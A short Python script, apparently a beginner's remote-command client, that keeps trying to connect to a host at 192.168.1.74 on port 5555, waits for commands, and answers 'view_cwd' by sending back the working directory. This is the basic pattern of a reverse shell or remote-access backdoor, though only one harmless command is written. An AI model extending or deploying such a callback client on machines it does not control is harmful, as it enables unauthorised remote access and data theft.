from math import fabs
import socket
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "192.168.1.74"
port = 5555
connected = False

while connected == False:
    try:
        s.connect((host, port))
        connected = True
    except:
        print("couldn't connect")

get_command = True


print(f"connected to: {host} on port: {port}")

while True:
    if get_command == True and connected == True:
        commands = s.recv(1024)
        command = commands.decode()
        print(f"Command received: {command}")
        print("")

        if command == "view_cwd":
            try:
                files = os.getcwd()
                file = str(files)
                s.send(file.encode())
                print(f"command excuted: {command}")
            except:
                print("error")

